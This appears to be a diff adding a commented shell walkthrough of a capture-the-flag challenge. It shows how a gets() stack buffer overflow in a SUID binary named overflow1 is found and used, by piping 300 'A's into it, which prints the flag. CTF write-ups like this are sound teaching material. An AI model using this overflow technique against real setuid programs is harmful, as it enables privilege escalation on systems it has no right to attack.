@@ -1,0 +1,22 @@
+# Lets look around
+ls -lart
+
+# Ok, so the flag is root readable, but overflow1 is a SUID binary
+cat overflow1.c
+# gets() will take any length input, buffer overflow
+# all we have to do is change the value of modify_me to be non-zero
+# since modify-me is delcared before buffer, it will be "above" it on the stack
+# If we overflow buffer, it will run into modify_me and we can control its value 
+
+# How secure is the binary?
+./checksec.sh --file overflow1
+# Not secure at all, awesome
+
+# First step of any buffer overlow is to crash it
+# run with a bunch of A's, see a crash
+python -c "print 'A'*300" > a
+./overflow1 < a 
+acsc2017{nothing_on_the_stack_is_safe}
+Segmentation fault (core dumped)
+
+# that was easy
